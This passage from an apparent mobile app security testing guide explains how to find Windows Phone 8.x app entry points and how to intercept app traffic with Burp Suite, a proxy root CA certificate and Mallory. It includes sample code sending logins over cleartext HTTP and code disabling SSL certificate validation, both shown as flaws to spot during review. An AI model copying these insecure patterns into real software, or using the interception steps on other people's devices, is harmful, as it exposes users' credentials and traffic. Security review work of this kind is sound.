review, an app’s XAML files are likely to be readily available. If an app uses\nWebBrowser controls, the app’s XAML files contain markup similar to the following:\n<Grid x:Name=\"ContentGrid\" Grid.Row=\"1\">\n<phone:WebBrowser HorizontalAlignment=\"Left\"\nMargin=\"20,50,0,0\" Name=\"myWebBrowser\" VerticalAlignment=\"Top\"\nHeight=\"500\" Width=\"430\" />\n</Grid>\nThis results in a WebBrowser control being generated, with its object bearing the name myWebBrowser. The\nobject can then be used by the application’s C# code to access the WebBrowser API. For example, the following\ncode would attempt to render a remote URL into the WebBrowser control:\nmyWebBrowser.Source = new Uri(\"http://www.google.co.uk\",\nUriKind.Absolute);\nor:\nmyWebBrowser.Navigate(new Uri(\"http://www.google.co.uk\",\nUriKind.Absolute));\nAlternatively, you can declare a WebBrowser control’s loading source directly in an XAML file:\n<phone:WebBrowser Source=\"http://www.google.co.uk\" />\nAnalysis for markup and C# code like the preceding is likely to quickly reveal an application’s use of WebBrowser\ncontrols.\nSimilarly, you can create WebView controls via a <WebView> tag in a page’s XAML file. For example, the following\nmarkup creates a WebView control on the associated page:\n<WebView x:Name=\"webView\"\nHeight=\"425\"\nHorizontalAlignment=\"Stretch\"\nVerticalAlignment=\"Stretch\"\nScrollViewer.ZoomMode=\"Disabled\"\nScrollViewer.VerticalScrollBarVisibility=\"Disabled\"\nLoaded=\"webView_Loaded\"\nNavigationFailed=\"webView_NavigationFailed\"\nNavigationCompleted=\"webView_NavigationCompleted\"\nVisibility=\"Visible\"/>\nIn many instances source code is not available to a security reviewer or would-be attacker. You can still easily\ndetermine use of WebBrowser and WebView controls by extracting XAML files from an application’s Install\ndirectory.\nAssuming you have installed the app to a device on which you have full filesystem access (see “Building a Test\nEnvironment” in Chapter 10), you can extract the app’s DLL file(s) from the app’s Install directory, and view\nXAML resources and reflected code recovered by .NET reflector, assuming the relevant part of the app consists\nof .NET assemblies.\nAs mentioned in the “Filesystem Access” and “Reverse Engineering” section (see Chapter 10), each app’s\nbinaries are located in its Install directory; that is, C:\\Data\\Programs\\{GUID}\\Install, where {GUID} is the app’s\nunique identifier. Upon browsing to the Install directory of the app you’re interested in, in your favorite file\nmanager, the app’s files and assets can be copied from the device’s filesystem onto your test machine.\nWhen you open them in a suitable tool, you can analyze XAML files as normal for declaration of WebBrowser\nand WebView controls. Analysis of recovered C# code can also indicate how the WebBrowser or WebView\ncontrol is used by the app, as in the previous C# snippets. Figure 11.1 demonstrates analysis of the XAML files\nrecovered by .NET reflector.\nFigure 11.1 Viewing XAML files in .NET reflector\nUse of WebBrowser and WebView controls is indicated in XAP packages by the presence of the\nID_CAP_WEBBROWSERCOMPONENT capability in the app’s manifest file (that is WMAppManifest.xml), which again you\ncan read in review or via extraction from the app’s C:\\Data\\Programs\\{GUID}\\Install directory on your device.\nFor 8.1-only apps, the more general capability internetClientServer is required in the Package.appxmanifest\nfile, instead.\nWe cover potential vulnerabilities that can arise due to the use of WebBrowser and WebView controls and how\nto exploit these issues in “Attacking WebBrowser and WebView Controls,” later in this chapter.\nBluetooth\nA Bluetooth API accessible to third-party developers was introduced with Windows Phone 8. The API offers two\ncore modes: app-to-app and app-to-device.\nYou can identify applications that use Bluetooth by the presence of the ID_CAP_PROXIMITY capability in their\nWMAppManifest.xml file in the case of XAP packages, or the proximity capability in Package.appxmanifest for\nAPPX apps (8.1 apps), such as this:\n<DeviceCapability Name=\"proximity\" />\nIn both app-to-app and app-to-device modes, the Bluetooth API can be used to locate nearby peers, and upon\nfinding one, used to connect to the peer. If both ends accept the connection, a socket can be created and\nassociated with the connection for the two hosts to communicate across.\nWhen you’re reviewing an app’s code in a code review, or reviewing code recovered via reverse\nengineering/reflection (see “Reverse Engineering” in Chapter 10), you’ll see that apps using Bluetooth will make\nuse of the PeerFinder and PeerInformation classes, which form part of the Proximity API (Windows\n.Networking.Proximity). To find more information on Bluetooth-relevant classes go to their respective MSDN\npages at http://msdn.microsoft.com/en-us/library/windows.networking.proximity.peerfinder.aspx and\nhttp://msdn.microsoft .com/en-us/library/windows.networking.proximity.peerinformation.aspx.\nFor example, a code fragment similar to the following would indicate that the application makes a connection to\na Bluetooth peer it finds, attempts to initiate a connection, and upon succeeding, associates a socket with the\nconnection for further communications with the ‘peer’ app or device.\nvar peers = await PeerFinder.FindAllPeersAsync();\n[ ERROR CHECKING OMITTED]\n// select the first peer we found\nPeerInformation selectedPeer = peers[0];\nvar streamSocket = await PeerFinder.ConnectAsync(selectedPeer);\n// Attempt a connection\nDoSomethingUseful(streamSocket);\nBecause the Bluetooth API allows Windows Phone applications to communicate with nearby devices and apps,\nits viability as an entry point for potentially malicious data is obvious. Depending on the nature of the app in\nquestion, an app may receive binary data that can be parsed unsafely, may receive data that is stored to a file, or\nreceive data that is otherwise processed in a way that could potentially be exploited by an attacker.\nThe takeaway point here is that any data received over Bluetooth is potentially malicious and is subject to the\nsame untrusted data-handling problems that all applications can suffer from. Of course, how received data is\nused is central in a security review; hence the usefulness in identifying this entry point, after which you can\nfollow the data along all code paths it is used in.\nHTTP Sessions\nAs with applications for other smartphone platforms, many network-connected Windows Phone applications\nmake web requests, such as to REST, SOAP, or JSON APIs, to retrieve information and to fulfill other pieces of\nfunctionality and behavior.\nData received in HTTP sessions may be parsed or processed in unsafe ways by an application, meaning the use\nof HTTP APIs represent viable data entry points, especially considering that data returned by web APIs is often\nuntrusted and supplied or influenced by other users of a service.\nIn Windows Phone 8.x, at the time of writing, several popularly used HTTP APIs are available. Windows Phone\n8 has System.Net.Http.HttpClient (http://msdn.microsoft .com/en-\nus/library/system.net.http.httpclient(v=vs.118).aspx), and Windows Phone 8.1 has\nSystem.Net.Http.HttpClient and also Windows.Web.Http .HttpClient (http://msdn.microsoft.com/en-\nUS/library/windows/apps/windows .web.http.httpclient ). Both WP8 and 8.1 also have the HttpWebRequest\n(http://msdn.microsoft.com/en-us/library/system.net.httpwebrequest(v=vs.110) .aspx) class, which also\nallows web requests to be made easily.\nThe following code sample demonstrates a GET request being issued on the example.com URL using\nSystem.Net.Http.HttpClient, and the response is displayed in a message box:\nvar httpClient = new HttpClient();\nvar response = await httpClient.GetAsync(new Uri(\n\"http://www.example.com/api/getInfo\",\nUriKind.RelativeOrAbsolute));\nresponse.EnsureSuccessStatusCode();\nvar txt = response.Content.ReadAsStringAsync();\nMessageBox.Show(txt.Result);\nYou can find additional information on the common HTTP APIs on their respective MSDN pages, referenced\npreviously.\nNetwork Sockets\nAlthough more network-connected Windows Phone applications tend to use HTTP client APIs to simply talk to\nweb services, it’s still not uncommon for apps to communicate with remote hosts using (somewhat) lower-level\nsocket classes, using HTTP or some other protocol or scheme.\nIf a Windows Phone application uses sockets and is written in C#, the app is likely to be using the\nSystem.Net.Sockets namespace or a relevant class in the Windows.Networking.Sockets namespace. When you’re\nreviewing code or code recovered via reflection, lines of code similar to the following are likely to indicate the\nuse of sockets in the app,\nusing System.Net.Sockets;\nor\nusing Windows.Networking.Sockets.<type>;\nThe method names for connecting to a remote endpoint, sending data over a socket, and receiving data over a\nsocket, are, quite predictably, named ConnectAsync(), SendAsync(), and RecvAsync(). So paying attention to the\nuse of these APIs is helpful when identifying entry points and analyzing an app’s behavior and functionality.\nYou can find more information on the System.Net .Sockets API on MSDN (http://msdn.microsoft.com/en-\nus/library/windows/apps/hh202858(v=vs.105).aspx and http://msdn.microsoft.com/en-\nus/library/windows/apps/system.net.sockets(v=vs.105).aspx).\nIn general, the classes most often encountered from the Windows.Networking .Sockets namespace will be\nStreamSocket and DatagramSocket, which are TCP and UDP implementations, respectively. Refer to MSDN\ndocumentation for details on the usage of StreamSocket, DatagramSocket, and other Windows\n.Networking.Sockets classes (http://msdn.microsoft.com/en-us/library/windows/apps/br212061.aspx).\nNear Field Communication\nSome Windows Phone carrier devices support Near Field Communication (NFC), which you can use to transfer\ndata between devices that are within very close proximity to one another. Typically, this means a couple of\ncentimeters.\nThe standard class for sending and receiving string data between an NFC-enabled app and a proximity device in\nC# apps is the ProximityDevice class (http://msdn.microsoft.com/en-\nus/library/windows.networking.proximity .proximitydevice.aspx).\nFor example, you may use a code fragment similar to the following to publish a new WriteTag NFC message:\nProximityDevice nfcDevice = ProximityDevice.GetDefault();\n[ ... ]\nif (nfcDevice != null) // nfc supported by device\n{\nlong nfcId = nfcDevice.PublishMessage(\n\"Windows.SampleMessageType\", \"This is an NFC message..\");\nDebug.WriteLine(\"id of nfc message is {0}\", nfcId);\n[ ... ]\n}\nelse { // nfc not supported by device\nthrowNfcError();\n}\nConversely, to receive an NFC message, you may use code such as the following:\nProximityDevice myNfcDevice = ProximityDevice.GetDefault();\n// Make sure NFC is supported\nif (myNfcDevice != null)\n{\nlong Id = myNfcDevice.SubscribeForMessage(\n\"Windows.SampleMessageType\", nfcMessageReceivedCallback);\n}\nprivate void nfcMessageReceivedCallback(\nProximityDevice sender,ProximityMessage message)\n{\nDebug.WriteLine(\"nfc message received from {0}:'{1}'\",\nsender.DeviceId, message.DataAsString);\n}\nAt this point, upon successfully receiving an NFC message, the message .DataAsString contains the data in\nstring format.\nApps that use NFC APIs must have the ID_CAP_NETWORKING and ID_CAP_PROXIMITY capabilities in their\nWMAppManifest.xml or, for APPX packages, presence of the proximity capability in the Package.appxmanifest\nfile:\n<DeviceCapability Name=\"proximity\" />\nInterestingly, Windows Phone’s NFC functionality offers an entry point into protocol handlers (an IPC\nmechanism), without the application in question even having subscribed for receiving NFC messages\n(http://msdn.microsoft.com/en-us/library/windows/apps/jj206987(v=vs.105).aspx).\nThis means that if a device receives an NFC message containing a URL, the URL is handled using the protocol\nhandler registered for that scheme on the receiving device. See the “Protocol Handlers” and “Interprocess\nCommunication Vulnerabilities” sections later in this chapter for more details.\nBarcodes\nMany smartphone applications include the ability to consume barcodes via the device’s built-in camera. Some\nexamples of types of apps with such functionality include apps from commercial retailers, banks, and ticket\nvendors for scanning in offers and discounts on products and services. In Windows Phone apps, the most likely\nof all the barcodes to be handled are undoubtedly QR codes.\nAlthough no publicly accessible APIs in Windows Phone 8.x exist for reading QR codes at the time of writing,\nseveral commonly used libraries are in the public domain, some of which are open source. A popular one is\nZXing.NET, which has an official codeplex project page (http://zxingnet.codeplex.com).\nApplications using ZXing.NET may use code similar to the following to parse the text out of a saved QR code\n(which may have been read in via the camera):\nIBarcodeReader reader = new BarcodeReader();\nvar barcodeBitmap = (Bitmap)Bitmap.LoadFrom(\"saved_qr_code.png\");\n// decode the barcode\nvar result = reader.Decode(barcodeBitmap);\n// did it work?\nif (result != null)\n{\ntxtDecoderType.Text = result.BarcodeFormat.ToString();\ntxtDecoderContent.Text = result.Text;\n}\nUpon successful decoding, txtDecoderContent.Text now contains the text represented by the barcode.\nApplications that require camera use must have the ID_CAP_ISV_CAMERA capability requested in their\nWMAppManifest.xml file, or in the case of Windows Phone 8.1 apps (APPX), the webcam capability must be\nrequested in the Package .appxmanifest file:\n<DeviceCapability Name=\"webcam\" />\nBarcodes may represent interesting data entry points because the application or the server-side application may\ntreat the recovered data with an unsafe level of trust. Possible examples include trusting data such that non-\nexistent offers or discounts are obtained due to unsuspecting server-side logic. Windows Phone apps could, in\nsome cases, also be vulnerable to various types of injection bugs when using parsed-out data from QR codes;\npossibilities are application and context dependent.\nSD Cards\nSD cards may represent an interesting entry point into applications that read from them, because files on SD\ncards aren’t necessarily trusted as files may be in the app’s sandbox.\nFiles on SD media are not necessarily trustworthy, because SD cards are often bought cheaply (such as online or\nat markets) and inserted into devices without precautions. SD cards may also be passed around among\ncolleagues and peers as a means of exchanging files.\nThe standard API for access to an SD card is Windows.Phone.Storage. Windows Phone 8.x provides SD card\naccess via file extension registration, meaning an app can only see and read files on the SD card that bear the file\nextension(s) the app has registered for. Windows Phone 8.1 also allows write access to SD cards, but again, only\nfor file extensions the app has registered.\nFile-handling associations are declared in an app’s WMAppManifest.xml or Package .appxmanifest file. An\napplication that can read files with the .ext file extension from the SD card may have markup similar to the\nfollowing in its manifest file:\n<Extensions>\n<FileTypeAssociation TaskID=\"_default\" Name=\"EXT\"\nNavUriFragment=\"fileToken=%s\">\n<Logos>\n<Logo Size=\"small\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo33x33.png\n</Logo>\n<Logo Size=\"medium\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo69x69.png\n</Logo>\n<Logo Size=\"large\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo176x176.png\n</Logo>\n</Logos>\n<SupportedFileTypes>\n<FileType ContentType=\"application/ext\">.ext</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extensions>\nOr, for apps targeting 8.1 only, in the Package.appxmanifest file:\n<Extension Category=\"windows.fileTypeAssociation\">\n<FileTypeAssociation Name=\"myext\">\n<DisplayName>myExt</DisplayName>\n<SupportedFileTypes>\n<FileType ContentType=\"application/myext\">.ext</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extension>\nBoth of these inform the OS to associate the .ext file extension with the application in question.\nAn app may then use the ExternalStorageDevice, ExternalStorageFolder, and other standard classes to read\n.ext files from a connected SD card. The following code retrieves the contents of all .ext files present on the SD\ncard and displays them in a message box:\nExternalStorageDevice sdCard = (await\nExternalStorage.GetExternalStorageDevicesAsync()).FirstOrDefault();\nif (sdCard != null)\n{\n// Get the root folder on the SD card.\nExternalStorageFolder sdrootFolder = sdCard.RootFolder;\nif (sdrootFolder != null)\n{\n// List all the files on the root folder.\nvar files = await sdrootFolder.GetFilesAsync();\nif (files != null)\n{\nforeach (ExternalStorageFile file in files)\n{\nStream s = await file.OpenForReadAsync();\nif (s != null || s.Length == 0)\n{\nlong streamLength = s.Length;\nStreamReader sr = new StreamReader(s);\n// display file contents\nMessageBox.Show(sr.ReadToEnd());\n}\nelse\n{\nMessageBox.Show(\n\"There were no files in the root folder\");\n}\n}\n}\n}\nelse\n{\nMessageBox.Show(\n\"Failed to get root folder on SD card\");\n}\n}\nelse\n{\nMessageBox.Show(\"SD Card not found on device\");\n}\nApps reading from SD cards require the ID_CAP_REMOVABLE_STORAGE or removableStorage capability to be present\nin their WMAppManifest.xml or Package .appxmanifest file (in 8.1-only apps), respectively.\nDepending on how an app uses or parses SD card file contents, use of untrusted SD cards could indeed represent\na security risk.\nFile extension associations are effectively a type of IPC mechanism. (See “Interprocess Communications\nInterfaces” and “Interprocess Communication Vulnerabilities” later in this chapter for more details on the\nsecurity aspects of file extension handlers in a more general context.)\nInterprocess Communications Interfaces\nThe term Interprocess Communications (IPCs) is used to describe meaningful interaction between two separate\nprocesses. Modern operating systems tend to have a variety of IPC mechanisms, often including named pipes,\nlocal domain sockets, shared memory regions, RPC/LPC interfaces, and others. In mobile operating systems\nhowever, where developers are operating in a much more closed environment, APIs tend to exist for only one or\ntwo IPC mechanisms, and use of the lower-level primitives that are implemented by the OS is discouraged or\neven prohibited by the respective application store rules.\nThe Windows Phone 8.x operating systems offer two officially supported IPC mechanisms: protocol handlers\nand file extension associations (also introduced briefly previously). These mechanisms allow third-party apps to\ninteract with each other, often allowing an app to pass data into another app, or influence its control flow or\noperation in some supposedly useful way.\nIt therefore stands to reason that exposure of IPC interfaces in applications can represent interesting data entry\npoints, so being able to identify their presence in apps is useful to a security reviewer.\nProtocol Handlers\nThe ability to register custom protocol handlers in your app was introduced in Windows Phone 8, and their use\nby developers is not dissimilar to how iOS and Android developers also register and use custom protocol\nhandlers in their apps. Protocol handlers are also known as URL handlers.\nChiefly, custom protocol handlers allow developers to register their own URL scheme, which can then be called\nexternally; for example, via a web page or via another store app. After it’s called, the app that owns the protocol\nscheme launches at a well-defined entry point function in which the launch and any data passed in via the URL\nscheme can be handled as the developer so desires.\nYou declare protocol handlers in an app’s WMAppManifest.xml or Package .appxmanifest file (for 8.1-only apps),\nwhich you’ll already have in a code review; if code is not available, you can obtain the WMAppManifest.xml file via\nfilesystem access on a device that has the app installed.\nThe presence of protocol handlers in an app is apparent by the presence of the <Protocol> tag in the\nWMAppManifest.xml manifest, because this is the tag used to register protocol handlers. For example, the\nfollowing XML fragment in the WMAppManifest.xml manifest would result in myproto:// being registered:\n[ ... ]\n<Extensions>\n<Protocol Name=\"myproto\"\nNavUriFragment=\"encodedLaunchUri=%s\" TaskID=\"_default\" />\n</Extensions>\n[ ... ]\nFor 8.1-only apps, something similar to the following would instead be present in the Package.appxmanifest file:\n<Extension Category=\"windows.protocol\">\n<Protocol Name=\"myproto\">\n<Logo>test.jpg</Logo>\n<DisplayName>myproto</DisplayName>\n</Protocol>\n</Extension>\nIf a device receives a URL via NFC, the relevant registered protocol handler launches to handle the received URL\n(see http://msdn.microsoft.com/en-us/library/windows/apps/jj206987(v=vs.105).aspx), as long as the user\ngives permission at a prompt. For example, a nearby Windows Phone device could use the Proximity API in the\nfollowing way to make the other phone handle the URL association in the same way it would with a locally\nlaunched URL:\nlong Id = device.PublishUriMessage(new System.Uri(\"myUrl:something\"));\nThis may be an interesting attack vector for reaching protocol handler entry points without a need for getting a\nuser to visit a rogue web page or getting a rogue app on the target device, because many users simply tap Yes (or\nequivalent) at all prompts.\nFile Extension Handlers\nFile handler associations were mentioned briefly in the earlier “SD Cards” section. To summarize briefly, file\nextension handlers are a type of IPC mechanism and work in a similar way to protocol handlers.\nExplained concisely, if an application registers to be associated with a given file extension, then every time a file\nbearing that extension is opened, the associated app launches and is given the option to handle that file. The app\ntypically copies the file, parses it, displays it, or otherwise processes it. A good example is a PDF reader—it\nregisters for association with the .pdf extension, and then opens, parses, and renders PDF files whenever one is\nopened.\nBecause applications that register as file extension handlers often parse the data found in the opened file, this\ntype of entry point can represent an interesting area in code reviews. Furthermore, because files may be received\nas email attachments or via browser downloads, attacks by remote attackers are also a possibility.\nYou can spot the presence of a file association handler by the presence of <FileTypeAssociation> and\n<FileType> tags in the WMAppManifest.xml file or in Package.appxmanifest for 8.1-only apps. For example, the\nfollowing markup registers the .myExt file extension to the app being installed:\n<Extensions>\n<FileTypeAssociation TaskID=\"_default\"\nName=\"myExt\" NavUriFragment=\"fileToken=%s\">\n<Logos>\n<Logo Size=\"small\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo33x33.png</Logo>\n<Logo Size=\"medium\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo69x69.png</Logo>\n<Logo Size=\"large\"\nIsRelative=\"true\">Assets/Route_Mapper_Logo176x176.png</Logo>\n</Logos>\n<SupportedFileTypes>\n<FileType ContentType=\"application/ext\">.myExt</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extensions>\nOr for 8.1-only apps (APPX):\n<Extension Category=\"windows.fileTypeAssociation\">\n<FileTypeAssociation Name=\"myext\">\n<DisplayName>myExt</DisplayName>\n<SupportedFileTypes>\n<FileType ContentType=\"application/myext\">.myExt\n</FileType>\n</SupportedFileTypes>\n</FileTypeAssociation>\n</Extension>\nToast Notifications\nToast notifications, also known as toasts, are messages that appear at the top of the screen (even when another\napp is in the foreground), informing the user of an event. For example, messaging apps could send a toast when\nsomeone initiates a conversation with the user.\nAlthough applications are supposed to send only toasts that map to pages in their own app, Windows Phone 8\n(not 8.1) allows code to send toast notifications that when tapped open XAML pages in other applications\ninstalled on the device. This is possible by calling a native API named Shell_PostMessaageToast(), which is\nexported by ShellChromeAPI.dll.\nToasts, therefore, potentially provide an entry point into XAML pages and therefore functionality that\ndevelopers most likely never intended to be callable by anyone but them and their own code.\nWe provide more information about toast notifications later in this chapter, in the “Interprocess\nCommunications Vulnerabilities” section, including how to send toasts to arbitrary apps and how they might\nhelp you exploit bugs in badly coded pages.\nAttacking Transport Security\nA large number of Windows Phone applications provide much of their core functionality by communicating with\nservices on the Internet. The specifics of why varies from application to application; many apps carry out\nnetworking communications to provide users with rich web-based interfaces, and some call into web-based APIs\nthat provide and facilitate the app’s functionality and purpose.\nWhen assessing a mobile application’s security, taking a look at its network transport aspects is important for\ntwo chief reasons: to gain insight into what is being sent to and received from network hosts, and to assess\nwhether sensitive traffic is being communicated back and forth with appropriate security measures applied. For\nexample, are logins and other authentications being done via SSL, or are they being done in the clear, via\nstandard HTTP?\nThis section explores how to assess the security of communications between an app and network hosts, as well\nas how to intercept communications for the purpose of manipulating traffic going either way between the app\nand a network host.\nWe also discuss how to identify implementation flaws that may be present even when HTTPS/SSL is used for\nsensitive traffic, and how such flaws may undermine the security of associated network traffic.\nIdentifying and Capturing Cleartext HTTP Communications\nDespite the implications of using a cleartext transport such as standard HTTP for sensitive data\ncommunications, many mobile apps use plaintext HTTP for the majority or all of their traffic. It’s still not\nuncommon at the time of writing this book for applications to perform authentication via cleartext HTTP, in the\nmobile, desktop, and enterprise worlds.\nOn the code level, a Windows Phone 8.x app may use the HttpClient class to interact with a web API, for\nexample. In a C# application, a call to a hypothetical authentication service could be comprised of the following\ncode:\nstring url = \"http://www.myapp.com/api/login\";\nvar values = new List<KeyValuePair<string, string>>\n{\nnew KeyValuePair<string, string>(\"username\", myUsername),\nnew KeyValuePair<string, string>(\"password\", myPassword)\n};\nvar httpClient = new HttpClient(new HttpClientHandler());\nHttpResponseMessage response = await httpClient.PostAsync(new Uri(url), new\nFormUrlEncodedContent(values));\nresponse.EnsureSuccessStatusCode();\nvar responseString = await response.Content.ReadAsStringAsync();\nThis code performs a POST request with the username and password credentials as POST parameters.\nSimilarly, an app could be using WebClient, HttpWebRequest, or another API to make its requests.\nThe uri string object is set to http://www.myapp.com/api/login, which is clearly a URL that will result in a non-\nSSL protected HTTP request being made. Given that the request is making an authentication call, such a coding\npractice represents a serious security risk, which could ultimately allow a suitably positioned attacker to\neavesdrop on the credentials and the request in general.\nEqually, a WebBrowser control may have been directed towards a non-HTTPS URL; that is:\nmyWebBrowser.Navigate(new Uri(\n\"http://www.google.co.uk\", UriKind.Absolute));\nThis could also be done with a WebView control.\nGiven code or code recovered using C# reflection tools, such a security issue is trivial to spot, but the issue is\nalmost equally as easy to find exclusively by basic manual testing, when no form of source code is available.\nYou can configure Windows Phone 8.x to route all HTTP traffic through a proxy tool, such as Burp Suite,\nFiddler, or OWASP’s ZAP. This capability allows for all standard HTTP traffic to be analyzed in real time as an\napp communicates with a remote web server.\nTo configure a Windows Phone 8.x device to push web traffic through a proxy, first configure your test laptop to\nbe on the same wireless network as your WP device, and run your HTTP proxy tool of your choice. Then go to\nSettings WiFi and click the name of the wireless network to which the device is connected. The screen presented\nwill closely resemble the one in Figure 11.2.\nFigure 11.2 The proxy settings disabled\nTo set a proxy server, switch the slider to right, and type the IP address (or hostname) of the system where\nyou’ve previously set up your proxy tool, and input the appropriate port number. (See Figure 11.3.)\nFigure 11.3 Proxy settings configured\nAt this point, you can see all standard HTTP traffic traveling from the device in the proxy application, such as\nBurp Suite capturing a request from a Samsung Ativ device to the Google search engine, as shown in Figure 11.4.\nFigure 11.4 Burp Suite captures web traffic from a Windows Phone device\nIf you are using the WP8 or WP8.1 emulator instead of a device, proxy settings do not need to be configured in\nthe device; simply configure proxy settings via Internet Explorer, because the emulator honors the proxy\nsettings of the host system.\nNow that cleartext HTTP traffic is being routed through an intercepting proxy, a tester can examine web traffic\nbeing sent and received by the device. An app sending and receiving sensitive information, including login\ncredentials, financial information, medical information, or Personally Identifiable Information (PII), is\nunacceptable, and constitutes a serious security threat.\nLikewise, if traffic (which will be cleartext HTTP) can be intercepted in real-time in this way, a plaintext HTTP\nsession also represents an entry point into the application because suitably positioned attackers who are\nperforming a man-in-the-middle attack on an unsuspecting user could inject data of their choice into HTTP\nresponses and requests. Such attacks could include injection of arbitrary HTML and JavaScript into\nWebBrowser interfaces.\nAlthough traffic issued through the standard HTTP APIs (HttpClient) and WebBrowser controls honors the\ndevice’s (or emulator’s) proxy settings, socket communications doesn’t, thus you must use other means to\nactively capture traffic that is non-HTTP(s) in nature. More on this topic appears later in “Capturing Non-\nHTTP/HTTPS Traffic.”\nIdentifying and Capturing HTTPS Communications\nWhen proxying an application, you might find that no HTTP traffic is visible in your proxy tool, even though you\nknow the app makes web requests. In cases like these, the app is most likely using HTTPS (that is, SSL\nprotected) as opposed to standard HTTP, and as a result, the SSL certificate chain validation check fails,\nresulting in no SSL session actually being negotiated. Such situations become apparent when no traffic shows in\nthe proxy, and often the app complains that something went wrong, or that Internet access was unavailable.\nApplications that are correctly using HTTPS for their web requests and API calls may be using code such as the\nfollowing:\nstring url = \"https://www.myapp.com/api/login\";\nvar values = new List<KeyValuePair<string, string>>\n{\nnew KeyValuePair<string, string>(\"username\", myUsername),\nnew KeyValuePair<string, string>(\"password\", myPassword)\n};\nvar httpClient = new HttpClient(new HttpClientHandler());\nHttpResponseMessage response = await httpClient.PostAsync(new Uri(url),\nnew FormUrlEncodedContent(values));\nresponse.EnsureSuccessStatusCode();\nvar responseString = await response.Content.ReadAsStringAsync();\nNote the use of the https:// URL.\nWhen HTTPS is being used, an appropriate root certification authority (CA) certificate must be installed on the\ndevice so that the certificate presented by the proxy tool validates correctly. This enables you to intercept HTTPS\ntraffic as seamlessly as you were able to intercept standard HTTP traffic.\nAssuming your proxy tool of choice is Burp Suite, you must first instruct Burp to generate a root CA certificate\nfor you by going to Proxy Options, and then clicking the CA certificate button. Choose Certificate in DER format,\nand then follow the wizard’s workflow through to export a certificate. (See Figure 11.5.)\nFigure 11.5 Exporting Burp Suite CA Certificate\nAt this point, change the .der file extension to having a .cer file extension.\nTo install Burp Suite’s root CA certificate, the certificate must first be somehow sent to the device. The easiest\nway to do this is via an email attachment.\nAfter it has been received on the device via the Mail application, simply click the .cer attachment. A screen\nsimilar to the one in Figure 11.6 appears.\nFigure 11.6 Installing the certificate onto the device\nTap Install to instruct the OS to accept the certificate into its root CA trust store. A screen displays indicating a\nsuccessful installation.\nWith the root CA certificate now installed on the device, the application will generally allow proxying through\nyour chosen proxy app, because the SSL validation process now completes successfully due to certificates being\npresented by Burp validating against Burp’s root CA certificate.\nThis procedure also works for installing CA certificates on the emulator.\nCapturing Non-HTTP/HTTPS Traffic\nAlthough the majority of apps for Windows Phone that rely on using the network use HTTP for their\ncommunications, you may occasionally come across one that uses Windows’ socket interfaces to talk to a\nnetwork endpoint; that is, System.Net.Sockets or Windows.Networking.Sockets.\nSuch an app may be using a roll-your-own style binary protocol, an already-documented (for example in an\nRFC) one, or could simply be communicating simple ASCII strings to a network listener, and receiving data in\nan equally simple format.\nWhichever the case may be, the two general options for eavesdropping on non-HTTP traffic are active and\npassive. Active interception allows you to modify incoming and outgoing traffic in real time, much like you’ve\ndone with HTTP/HTTPS traffic (for example, using Burp Suite as a proxy). Passive sniffing on the other hand\njust allows you to observe traffic from a non-modifying perspective and carry out analysis on the packets you\nsee. Passive traffic sniffing can be done from a suitably placed system using tools such as Wireshark and\ntcpdump and doesn’t require any kind of special setup.\nIf you want to actively intercept non-HTTP traffic in a similar way to that allowed by tools such as Burp Suite,\nyou’ll need to get inventive, because Windows Phone offers no standard way to use any kind of non-HTTP\nproxy.\nIntrepidus Group provides a tool named Mallory that is designed specifically for active capture and modification\nof non-HTTP traffic. Several supported and documented ways exist to set up Mallory to carry out a man-in-the-\nmiddle attack on non-HTTP communications going to and from a mobile app, one of which is to configure a\nsubject device to use a PPTP VPN.\nHowever, because Windows Phone 8 does not support VPN connections, and Windows Phone 8.1 does not\nsupport PPTP VPN servers, try setting up Mallory to function as part of a Wi-Fi hotspot, which you connect your\nWindows Phone device to. Proper setup allows you to view and modify all interesting communications\n(including non-HTTP) in Mallory. See the following guide, by the authors of Mallory, for a tutorial on how to get\nstarted with setting up and using the Mallory tool for non-HTTP traffic interception and modification:\nhttps://intrepidusgroup.com/insight/2010/12/mallory-and-me-setting-up-a-mobile-mallory-gateway/.\nSSL Certificate Validation Flaws\nWhen proxying an application, your HTTPS traffic may appear in your proxy app (Burp Suite) even though you\nhave not installed a root CA certificate for the proxy. This is indicative of a serious security flaw: SSL certificate\nvalidation has been disabled, and the app has connected to your proxy host even though the certificate it\npresented was not valid for the host the app was really trying to connect to.\nThis means that the app is skipping certificate chain validation and is therefore not verifying that the host it is\ntalking to (your proxy box) is genuinely the one it was expecting (i.e., some web API host). Such flaws can be\ndescribed as certificate validation flaws, and they allow for connections to be observed or tampered via man-in-\nthe-middle interception attacks by favorably positioned attackers.\nMost SSL/HTTPS APIs allow the developer to disable certificate validation checks so that when negotiating an\nSSL session, no certificate validation checks are actually carried out. Many coders enable this mode when\ndeveloping an app because many test environments are wired up to use self-signed or otherwise untrusted\ncertificates, which makes perfect sense while still in the development process. No SSL certificate validation\nerrors are thrown because of self-signed certs or otherwise, and the developers can do their job and get the app\ndeveloped and tested without issue.\nHowever, having developers who forget to remove the code that disables certificate validation is common, and\nmany apps end up shipping with the vulnerable code.\nEven worse, some apps end up shipping with non-validating SSL API call patterns simply because developers\ncopied and pasted the code from a site like Stack Overflow after they couldn’t figure out why their code wouldn’t\nwork in the (self-signed certificated) test environment.\nIn Windows Phone 8, no (documented) way exists to disable SSL certification validation in the HTTPS APIs.\nIn Windows Phone 8.1, however, you can instruct the Windows.Web.Http .HttpClient to ignore untrusted\ncertificates using the HttpBaseProtocolFilter class (see\nhttp://blogs.msdn.com/b/wsdevsol/archive/2013/10/17/how-to-ignore-self-signed-certificate-errors-in-\nwindows-store-apps-8-1.aspx).\nApps using Windows.Web.Http.HttpClient that have SSL certificate validation disabled are likely to be using code\nresembling the following:\nHttpBaseProtocolFilter filter = new HttpBaseProtocolFilter();\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.Untrusted);\nfilter.IgnorableServerCertificateErrors.Add(\nChainValidationResult.Expired);\nvar httpClient = new Windows.Web.Http.HttpClient(filter);\ntry\n{\nvar uri = new Uri(\"https://www.myapp.com/...\");\nHttpResponseMessage response = await httpClient.GetAsync(uri);\n}\nIn the preceding code, untrusted and expired certificates are set as trusted. Luckily, this is easy to spot in a code",
